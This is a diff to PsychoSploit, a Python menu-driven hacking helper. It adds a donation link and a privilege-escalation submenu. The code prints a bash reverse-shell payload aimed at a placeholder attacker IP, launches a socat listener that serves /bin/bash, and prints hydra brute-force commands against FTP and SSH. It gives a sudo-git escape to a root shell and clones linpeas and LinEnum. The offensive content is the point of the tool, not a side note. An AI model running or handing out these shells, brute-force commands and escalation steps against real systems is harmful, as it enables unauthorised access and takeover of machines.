@@ -17,7 +17,7 @@ print(Style.BRIGHT + Fore.RED + ' |    |   \___ \ \___  \  \___|   Y  (  <_> )  
 print(Style.BRIGHT + Fore.RED+  ' |____|  /____  >/ ____|\___  >___|  /\____/_______  /   __/|____/\____/|__||__|  ')
 print(Style.BRIGHT + Fore.RED + '              \/ \/         \/     \/              \/|__|                         ')
 print("\n")
-print('The Nmap Script Is Starting Up Please Be Patient....')
+print('Starting Up PsychoSploit....')
 done = False
 #here is the animation
 def animate():
@@ -56,6 +56,7 @@ print(Style.BRIGHT + Fore.CYAN +'[8] HTTPS Hydra Brute Force Command')
 print(Style.BRIGHT + Fore.CYAN +'[9] My Github :3')
 print(Style.BRIGHT + Fore.CYAN +'[10] Download rockyou.txt (This Will Download To your /Documents/ Directory)')
 print(Style.BRIGHT + Fore.CYAN + '[11] Reverse Shell Cheet Sheet')
+print(Style.BRIGHT + Fore.CYAN + '[12] Buy Me A Coffee')
 
 time.sleep(1)
 print('\n')
@@ -99,6 +100,10 @@ elif main == '10':
 elif main == '6':
     print('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ftp://IP')
     time.sleep(5)
+    os.system('python3 PsychoSploit.py')
+elif main == '12':
+    os.system('firefox https://www.buymeacoffee.com/PsychoCoder')
+    time.sleep(3)
     os.system('python3 PsychoSploit.py')
 elif main == '7':
     print('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ssh://IP')
@@ -322,6 +327,7 @@ print(Style.BRIGHT + Fore.MAGENTA + '[5] How To Stableize A Reverse Shell')
 print(Style.BRIGHT + Fore.MAGENTA + '[6] Stablize Your Shell (Instruction Guid)')
 print(Style.BRIGHT + Fore.MAGENTA + '[7] Start A PwnCat Listener')
 print(Style.BRIGHT + Fore.MAGENTA + '[8] Start A Socat Listener')
+print(Style.BRIGHT + Fore.LIGHTGREEN_EX + '[9] PrivEsc')
 
 time.sleep(1)
 print('\n')
@@ -337,11 +343,10 @@ elif listen == '2':
     os.system('python3 PsychoSploit.py')
 elif listen == '4':
     print(Style.BRIGHT + Fore.MAGENTA + 'A Listener is a tool which is used in pentests. NC or Netcat is know as the pentesters swissarmy knife due to the fact that \n it does not just serve as a listener but you can also use it to check if certian ports open ports are open or operational in a network or client! \n A listener is used to catch a open connection that is made via a reverse shell or backdoor. You can read more about Listeners with the following link ------> https://www.hackers-arise.com/hacking-fundamentals')
-    time.sleep(6)
     os.system('python3 PsychoSploit.py')
 elif listen == '5':
     print('So you have gotten a shell that may look like this "$" or just looks like a blank terminal command line that is what you call A unstable Shell! There are many ways to stabalize your reverse shell! \n one of the basic ways to stabilize your reverse shell is stabilizing it with python! TO get the python command inorder to stabalize your shell re-launch the script and choose option 6 which will make A .txt document with instructions to stabalize your shell!!!')
-    time.sleep(6)
+    time.sleep(3)
     os.system('python3 PsychoSploit.py')
 elif listen == '6':
     time.sleep(3)
@@ -368,3 +373,87 @@ elif listen == '8':
     time.sleep(3)
     print('H4PPY H4CK3ING; You Can Use The payload sh -i >& /dev/tcp/YOUR_IP/4444 0>&1 on the Victim machine to get the reverse Shell!')
     os.system("socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash")
+
+elif listen == '9':
+    time.sleep(3)
+    os.system('mkdir ~/PsychoSploit/PrivEsc')
+    time.sleep(2)
+    print("\n")
+print('[*] Getting The PrivEsc Helpers Warmed Up...')
+done = False
+#here is the animation
+def animate():
+    for c in itertools.cycle(['|', '/', '-', '\\']):
+        if done:
+            break
+        sys.stdout.write('\rLOADING... ' + c)
+        sys.stdout.flush()
+        time.sleep(0.1)
+    sys.stdout.write('\r[+]R00T TH03S SYST3MS!     ')
+
+t = threading.Thread(target=animate)
+t.start()
+
+#long process here or Time Process to extend the wairt just edit the time.sleep(10) variable to what ever number that you want
+time.sleep(5)
+done = True
+print('\n')
+time.sleep(2)
+os.system('clear')
+print(Style.BRIGHT + Fore.LIGHTGREEN_EX + '__________        .__      ___________              ')
+print(Style.BRIGHT + Fore.LIGHTGREEN_EX + '\______   \_______|__|__  _\_   _____/  ______  ____  ')
+print(Style.BRIGHT + Fore.LIGHTGREEN_EX + ' |     ___/\_  __ \  \  \/ /|    __)_  /  ___/ / ___\ ')
+print(Style.BRIGHT + Fore.LIGHTGREEN_EX + ' |    |     |  | \/  |\   / |        \ \___ \ \  \___ ')
+print(Style.BRIGHT + Fore.LIGHTGREEN_EX + ' |____|     |__|  |__| \_/ /_______  /____  > \___  >')
+print(Style.BRIGHT + Fore.LIGHTGREEN_EX + '                                   \/     \/     \/ ')
+print('\n')
+print('\n')
+
+print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[1] What Is PrivEsc')
+print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + "[2] How To PrivEsc (Exploit What A User In A Linux Machine's Sudo Is)")
+print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[3] How To PrivEsc (Crontab)')
+print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[4] How To PrivEsc (Kernal Exploits)')
+print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[5] How To Look For Special Files Or Ways To PrivEsc (Linpeas)')
+print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[6] Download PrivEsc Tools (Will Install Linpeas and LinEnum)')
+
+time.sleep(1)
+print('\n')
+privesc = input(Style.BRIGHT + Fore.YELLOW + 'PWNED: ')
+
+if privesc == '6':
+    time.sleep(3)
+    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'Getting Linpeas and LinEnum Downloaded Once Downloaded They Will Be Locaed In Your ~/PsychoSploit/PrivEsc/ Directory!...')
+    time.sleep(2)
+    os.system('git clone https://github.com/rebootuser/LinEnum.git && mv LinEnum/ ~/PsychoSploit/PrivEsc/')
+    os.system('git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git && mv privilege-escalation-awesome-scripts-suite/ ~/PsychoSploit/PrivEsc/')
+    time.sleep(2)
+    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'Done! Both Linpeas and LinEnum Are Now Located In Your ~/PsychoSploit/PrivEsc/ Directory!')
+    time.sleep(5)
+    os.system('python3 PsychoSploit.py')
+elif privesc == '2':
+    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'There are many ways to obtain Root in a system one way is to exploit their "sudo" ussage. For Example i have a linux Machine and i have 2 users and 2 users only \n one user is Dave and the other is Root (Administrator). Now the User Dave is able to run "Git" as root useing sudo. They are able to run "Git" as Administrator! but how to we Exploit the User Dave sudo? There are many ways to obtain root from git \n one way is to to the following command "sudo git -p help config" and then type "!/bin/sh" To obtain root (Administrator) Of the machine! \n Now that might be one way but there are many other ways to get root from a users sudo. but one main question is How do we know what the users sudo is? \n well what is easy we can easily check that via the command "sudo -l" This wil show you what the user is able to run as sudo! Here is a blog talking about privesc via sudo \n PrivEsc Via A Users Sudo https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d \n GTFOBINS https://gtfobins.github.io/ \n What is gtfo bins? gtfobins is a website that shows you many ways to PrivEsc Via a linux users Sudo!')
+    time.sleep(10)
+    os.system('python3 PsychoSploit.py')
+elif privesc == '1':
+    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'What is PrivEsc? To privesc is to upgrade your user to system administrator!')
+    time.sleep(3)
+    os.system('python3 PsychoSploit.py')
+elif privesc == '3':
+    time.sleep(3)
+    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'BE AWARE THAT IN A FEW SECONDS 3 PAGES SHOWING YOU HOW TO PRIVESC VIA CRONTABS WILL POP UP IN 3 SECONDS!')
+    time.sleep(3)
+    os.system('firefox https://medium.com/swlh/privilege-escalation-via-cron-812a9da9cf1a')
+    os.system('firefox https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/')
+    os.system('firefox https://drigbypentest.com/2020/11/13/linux-privesc-3-cronjobs/')
+    time.sleep(3)
+    os.system('python3 PsychoSploit.py')
+elif privesc == '4':
+    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'now first question is how do we check the kernal of the linux machine? well first we do the simple command "uname -r" This will show us the kernal version of the linux machine and what we can do to easily find a exploit for it is \n copy the kernal version and type "<linux_kernal_version> exploit-db or exploits! here is a link to a Stack Exchange article on how to detect kernal exploits ------> https://security.stackexchange.com/questions/174877/how-can-you-detect-kernel-exploits"')
+    time.sleep(10)
+    os.system('python3 PsychoSploit.py')
+elif privesc == '5':
+    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'How To Look For Special Files Or Ways To PrivEsc (Linpeas)! ok so inorder for us to get this setup i have made a "How_to_use_linpeas.txt" This will be created and moved to your u guessed it your /Desktop/temp/ folder in there it will show you how to use linpeas and its manual! \n the file will appear in approximatly 3 seconds!')
+    time.sleep(3)
+    os.system('cp ~/PsychoSploit/src/How_to_use_linpeas.txt ~/Desktop/temp/')
+    time.sleep(2)
+    print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + 'Done! Check your /Desktop/temp/ !!')
